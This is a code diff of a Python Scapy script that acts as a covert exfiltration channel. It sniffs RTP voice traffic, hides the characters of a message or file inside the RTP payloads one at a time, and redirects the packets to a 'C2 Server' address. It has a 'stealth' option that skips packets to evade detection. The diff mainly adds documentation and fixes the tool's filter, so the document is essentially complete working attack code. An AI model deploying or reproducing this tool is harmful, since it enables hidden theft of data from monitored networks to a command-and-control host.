@@ -1,78 +1,102 @@
 import argparse
 import base64
-import binascii
 import queue
-import time
 import scapy.all as scapy
 from scapy.all import sendp
-from scapy.layers.inet import UDP
-from scapy.layers.inet import IP
+from scapy.layers.inet import UDP, IP, Ether
 from scapy.packet import Raw
-from scapy.packet import ls
-from scapy.all import bytes_hex
-from scapy.layers.inet import Packet
 
 
 def encodePacket(packet, character):
+    """
+    Encodes the raw data in the given RTP packet with a character. The given character replaces the first byte in the
+    RTP payload.
+    @param packet: preconfigured Scapy RTP packet
+    @param character: the ascii (256bit) character to encode
+    @return: the same packet with encoded payload
+    """
     rawData = packet[Raw].load
     packet[Raw].load = rawData[:12] + bytes(character, encoding="raw_unicode_escape") + rawData[13:]
     return packet
 
 
-def changeIPAndPort(packet, address, port):
+def changeDestinationIPAndPort(packet, address, port):
+    """
+    Changes the destination IP address and destination port of a preconfigured Scapy packet.
+    @param packet: preconfigured Scapy packet
+    @param address: the new destination address
+    @param port: the new destination port
+    @return: the same packet with the modified fields
+    """
     packet[IP].dst = address
     packet[UDP].dport = port
     return packet
 
 
 def sendPacket(packet):
+    """
+    Sends an outgoing, preconfigured Scapy packet.
+    @param packet: preconfigured Scapy packet
+    @return: None
+    """
+    # Mac Address and Checksums are recomputed with the sendp function.
     del packet[UDP].chksum
     del packet[IP].chksum
+    del packet[Ether].dst
     sendp(packet, verbose=0)
 
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
-    parser.add_argument("-m", "--message", help="String message to send")
-    parser.add_argument("-f", "--filename", help="File to send")
-    parser.add_argument("-s", "--stealth", help="Number of packet encodings between each RTP transmission")
-    parser.add_argument("-d", "--destination_address", help="The destination ipv4 address we send encoded RTP traffic")
-    parser.add_argument("-c", "--C2_listening_port", help="The port we forward encoded RTP traffic ro")
-    parser.add_argument("-i", "--host_ips", help="The ipv4 addresses of hosts in the RTP session")
+    parser.add_argument("-m", "--message", help="String message to send.")
+    parser.add_argument("-f", "--filename", help="Filename of text message to send.")
+    parser.add_argument("-s", "--stealth", default=1, help="Number of packets skipped before next RTP encoding.")
+    parser.add_argument("-d", "--destination_address", required=True, help="The C2 Server destination ipv4 address.")
+    parser.add_argument("-c", "--C2_listening_port", required=True, help="The C2 Server port we send traffic to.")
+    parser.add_argument("-i", "--host_ips", required=True, help="The ipv4 addresses of hosts in the RTP session.")
     args = parser.parse_args()
 
     stealthVal = int(args.stealth)
     destinationAddress = args.destination_address
     listeningPort = int(args.C2_listening_port)
 
-    print(args)  # Debugging
+    print("Input arguments: ", args)  # Debugging
+
     if args.filename is not None:
-        file = open(args.filename, 'rb')
-        transmissionString = base64.b64encode(file.read())
+        file = open(args.filename, 'r')
+        transmissionString = file.read()
         file.close()
     else:
         transmissionString = args.message
 
-    packetQ = queue.Queue()
+    # Create filter
     sessionHostList = args.host_ips.split(",")
-    filterString = f"dst host {sessionHostList} "
+    filterString = f"dst host {sessionHostList[0]} "
     for h in sessionHostList[1:]:
         filterString += f"or dst host {h} "
+
+    # Setup packet sniffer
+    packetQ = queue.Queue()
     asyncSniffer = scapy.AsyncSniffer(filter=filterString, prn=lambda x: packetQ.put(x))
     asyncSniffer.start()
 
+    # Statistical information for transmission
     encodedPackets = 0
     sentPackets = 0
-    while encodedPackets < len(transmissionString):
+    percentageDone = 0
+
+    while encodedPackets < len(transmissionString):     # Begin transmission
         if packetQ.qsize() > 0:
             pkt = packetQ.get()
-            if pkt.haslayer(IP):
+            if pkt.haslayer(IP) and pkt.haslayer(UDP):
                 if sentPackets == 0:
-                    sendPacket(encodePacket(changeIPAndPort(pkt, destinationAddress, listeningPort), transmissionString[encodedPackets]))
+                    sendPacket(encodePacket(changeDestinationIPAndPort(pkt, destinationAddress, listeningPort), transmissionString[encodedPackets]))
                     encodedPackets += 1
-                    print(f"Percentage complete: {encodedPackets / len(transmissionString)}%")
+                    if (100 * encodedPackets) // len(transmissionString) != percentageDone:
+                        percentageDone = (100 * encodedPackets) // len(transmissionString)
+                        print(f"Percentage complete: {percentageDone}%")
                 else:
-                    sendPacket(changeIPAndPort(pkt, destinationAddress, listeningPort))
+                    sendPacket(changeDestinationIPAndPort(pkt, destinationAddress, listeningPort))
                 sentPackets = (1 + sentPackets) % stealthVal
 
     asyncSniffer.stop()
